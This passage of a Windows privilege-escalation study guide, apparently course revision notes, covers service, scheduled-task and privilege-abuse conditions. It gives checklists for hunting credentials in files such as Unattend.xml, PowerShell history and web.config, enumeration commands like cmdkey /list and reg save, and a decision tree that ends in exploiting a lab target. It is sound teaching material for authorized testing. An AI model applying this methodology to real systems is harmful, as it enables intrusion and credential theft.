# 60. Important Distinctions to Memorize

| Finding | What must be true? |
|---|---|
| Scheduled-task abuse | Task runs privileged + task executable/script is writable |
| Writable service binary | Service runs privileged + binary is writable |
| Unquoted service path | Path is unquoted + earlier candidate location is writable |
| Service DACL abuse | User can modify service configuration |
| AlwaysInstallElevated | Required HKCU + HKLM installer settings both enabled |
| SeBackup/SeRestore | Privilege available + backup/restore functionality can be abused |
| SeTakeOwnership | Can take ownership + can grant access/modify target |
| SeImpersonate | Attacker-controlled process + privileged authentication/token |
| Vulnerable software | Correct vulnerable version + applicable exploit |
| Credential harvesting | Credential exists + current user can access/reuse it |

---

# 61. `sc` vs `sc.exe` — Important Windows Detail

In `cmd.exe`:

```cmd
sc
```

is the Service Control utility.

In PowerShell:

```powershell
sc
```

is an alias for:

```powershell
Set-Content
```

Therefore, when controlling Windows services from PowerShell, use:

```powershell
sc.exe
```

This is a small detail but extremely useful during practical work.

---

# 62. Permission Terminology

## `icacls`

Use `icacls` to inspect Windows ACLs.

Common permission abbreviations encountered in the source:

| Abbreviation | Meaning |
|---|---|
| `F` | Full access |
| `M` | Modify |
| `RX` | Read + Execute |
| `AD` | Add subdirectory |
| `WD` | Write data |

Always interpret permissions in context:

```text
Who has the permission?
        +
What permission?
        +
What object?
        ↓
Can my current account influence privileged execution?
```

---

# 63. Service Investigation Checklist

When you find an interesting service:

```text
[ ] sc.exe qc <service>
[ ] Identify BINARY_PATH_NAME
[ ] Identify SERVICE_START_NAME
[ ] Check whether path is quoted
[ ] Check executable permissions with icacls
[ ] Check parent directory permissions
[ ] Check service DACL with AccessChk
[ ] Determine whether current user can:
      [ ] modify executable
      [ ] replace executable
      [ ] modify service configuration
      [ ] stop/start/restart service
[ ] Determine resulting service account
[ ] Verify privilege after exploitation
```

---

# 64. Scheduled Task Checklist

```text
[ ] Enumerate tasks
[ ] Identify interesting task
[ ] Read Task To Run
[ ] Identify Run As User
[ ] Check executable/script permissions
[ ] Check parent directory permissions
[ ] Determine whether current user can modify it
[ ] Determine whether task can be triggered
[ ] Verify resulting account with whoami
```

---

# 65. Credential-Hunting Checklist

```text
[ ] Unattend.xml
[ ] Panther files
[ ] Sysprep files
[ ] PowerShell history
[ ] cmdkey /list
[ ] IIS web.config
[ ] PuTTY registry
[ ] Browser/application credential stores
[ ] Service configuration
[ ] Other readable configuration files
```

---

# 66. Dangerous-Privilege Checklist

Run:

```cmd
whoami /priv
```

Then investigate:

```text
[ ] SeBackupPrivilege
[ ] SeRestorePrivilege
[ ] SeTakeOwnershipPrivilege
[ ] SeImpersonatePrivilege
[ ] SeAssignPrimaryTokenPrivilege
```

The presence of a privilege is a **lead**; understand the exact conditions needed to abuse it.

---

# 67. Automation Checklist

```text
[ ] WinPEAS
[ ] PrivescCheck
[ ] WES-NG
[ ] Metasploit local_exploit_suggester
```

Remember:

```text
Automated tool says "nothing found"
        ≠
No privilege escalation exists
```

Always manually validate important findings.

---

# 68. Public-Exploit Decision Process

When an automated tool identifies a possible vulnerability:

```text
Software/version identified
        ↓
Does a CVE exist?
        ↓
Does public exploit code exist?
        ↓
Does exploit match:
   - version?
   - architecture?
   - OS/distribution?
   - prerequisites?
        ↓
Read/understand exploit
        ↓
Assess stability
        ↓
Run in authorized environment
        ↓
Verify privilege
```

---

# 69. What to Memorize

### Accounts

- Administrators
- Standard Users
- SYSTEM / LocalSystem
- Local Service
- Network Service

### Commands

```cmd
whoami
whoami /priv
schtasks
schtasks /query /tn <task> /fo list /v
icacls <path>
sc.exe qc <service>
sc.exe config ...
cmdkey /list
runas /savecred
wmic product get name,version,vendor
takeown
reg query
reg save
```

### Core tools

- WinPEAS
- PrivescCheck
- WES-NG
- AccessChk
- Metasploit local exploit suggester

### Core attack concepts

- Credential harvesting
- Scheduled-task abuse
- Writable service executable
- Unquoted service paths
- Service DACL abuse
- AlwaysInstallElevated
- SeBackup / SeRestore
- SeTakeOwnership
- SeImpersonate / SeAssignPrimaryToken
- Vulnerable software
- Missing patches

---

# 70. What to Look Up When Needed

You do **not** need to memorize every exploit's exact syntax.

Look up:

- Exact CVE details
- Public exploit code
- Exploit-specific requirements
- Payload syntax
- Service-specific behavior
- Exact AccessChk options
- WES-NG database usage
- Metasploit module details
- Token-impersonation techniques
- Software-specific vulnerabilities

The important skill is recognizing the **condition that makes a technique possible**.

---

# 71. Fast Windows Privilege-Escalation Decision Tree

```text
What account am I?
        ↓
whoami + whoami /priv
        ↓
Do I have useful credentials?
        ├── YES → Test authorized reuse
        └── NO
             ↓
Check scheduled tasks
             ↓
Privileged task + writable executable?
        ├── YES → Validate and exploit
        └── NO
             ↓
Check services
             ↓
Writable service executable?
        ├── YES → Validate
        └── NO
             ↓
Unquoted service path + writable location?
        ├── YES → Validate
        └── NO
             ↓
Service DACL allows reconfiguration?
        ├── YES → Validate
        └── NO
             ↓
Check dangerous privileges
             ↓
SeBackup / SeRestore?
SeTakeOwnership?
SeImpersonate / SeAssignPrimaryToken?
             ↓
Check installed software + versions
             ↓
Known vulnerable software?
             ↓
Research CVE / exploit
             ↓
Run automated enumeration
             ↓
WinPEAS / PrivescCheck / WES-NG / Metasploit
             ↓
Manually validate findings
             ↓
Exploit authorized lab target
             ↓
whoami / id-equivalent verification
```

---

# 72. Complete Mental Model

Think about Windows privilege escalation through **five major buckets**:

```text
1. CREDENTIALS
   ↓
   Can I authenticate as someone more privileged?

2. TASKS
   ↓
   Does a privileged scheduled task execute something I can control?

3. SERVICES
   ↓
   Can I control the binary, path, or configuration of a privileged service?

4. PRIVILEGES
   ↓
   Has Windows assigned my account a powerful privilege I can abuse?

5. SOFTWARE
   ↓
   Is installed software vulnerable because it is unpatched or exploitable?
```

Automation supports all five:

```text
WinPEAS
PrivescCheck
WES-NG
Metasploit
        ↓
Find leads
        ↓
Manual validation
        ↓
Exploit
        ↓
Verify
```

---

# 73. Final Revision Checklist

Before finishing Windows local privilege-escalation enumeration, ask:

## Identity

- [ ] Who am I?
- [ ] What groups am I in?
- [ ] What privileges do I have?

## Credentials

- [ ] Did I inspect unattended installation files?
- [ ] Did I inspect PowerShell history?
- [ ] Did I run `cmdkey /list`?
- [ ] Did I inspect IIS `web.config`?
- [ ] Did I check PuTTY and other credential-storing software?

## Scheduled Tasks

- [ ] What tasks exist?
- [ ] Which run as privileged users?
- [ ] What executable/script do they run?
- [ ] Can I modify it?
- [ ] Can I trigger it?

## Services

- [ ] What services exist?
- [ ] What executable does each interesting service use?
- [ ] What account runs it?
- [ ] Is the executable writable?
- [ ] Is the parent directory writable?
- [ ] Is the service path unquoted?
- [ ] Can I write to an earlier path candidate?
- [ ] Can I modify the service DACL/configuration?
- [ ] Can I restart the service?

## Dangerous privileges

- [ ] `SeBackupPrivilege`
- [ ] `SeRestorePrivilege`
- [ ] `SeTakeOwnershipPrivilege`
- [ ] `SeImpersonatePrivilege`
- [ ] `SeAssignPrimaryTokenPrivilege`

## Software

- [ ] What software is installed?
- [ ] What versions are installed?
- [ ] Could `wmic` have missed something?
- [ ] Are there vulnerable services/applications?
- [ ] Are there missing patches?
- [ ] Is there a matching public exploit?

## Automation

- [ ] WinPEAS
- [ ] PrivescCheck
- [ ] WES-NG
- [ ] Metasploit local exploit suggester

## Validation

- [ ] Did I understand the attack condition?
- [ ] Did I check permissions?
- [ ] Did I check execution context?
- [ ] Did I check compatibility?
- [ ] Did I verify the final privilege level?

---

# 74. One-Page Mental Summary

```text
WINDOWS PRIVESC
│
├── CREDENTIALS
│   ├── Unattend.xml
│   ├── PowerShell history
│   ├── cmdkey
│   ├── IIS web.config
│   ├── PuTTY
│   └── Other software
│
├── SCHEDULED TASKS
│   ├── schtasks
│   ├── Task To Run
│   ├── Run As User
│   └── Writable executable/script
│
├── SERVICES
│   ├── sc.exe qc
│   ├── Writable executable
│   ├── Unquoted service path
│   └── Writable service DACL/config
│
├── DANGEROUS PRIVILEGES
│   ├── SeBackup / SeRestore
│   ├── SeTakeOwnership
│   └── SeImpersonate / SeAssignPrimaryToken
│
├── SOFTWARE
│   ├── wmic
│   ├── Versions
│   ├── CVEs
│   └── Public exploits
│
└── AUTOMATION
    ├── WinPEAS
    ├── PrivescCheck
    ├── WES-NG
    └── Metasploit
```

---

# 75. Final Principle

> **Windows privilege escalation is primarily about finding a privileged execution context that your current account can influence.**

For every finding, ask:

```text
WHO executes it?
        ↓
WHAT executes?
        ↓
CAN I MODIFY/INFLUENCE IT?
        ↓
WHAT PRIVILEGE WILL I GET?
        ↓
CAN I VERIFY THE RESULT?
```

That mental model ties together credentials, scheduled tasks, services, dangerous privileges, vulnerable software, and automated enumeration.

---

## Source Scope

This guide is based on the supplied **“05-Windows Privilege Escalation”** material and preserves its major concepts, commands, examples, attack chains, tool usage, limitations, and lab methodology. It is organized for **revision, practical reference, and GitHub documentation**, rather than being a shortened summary.
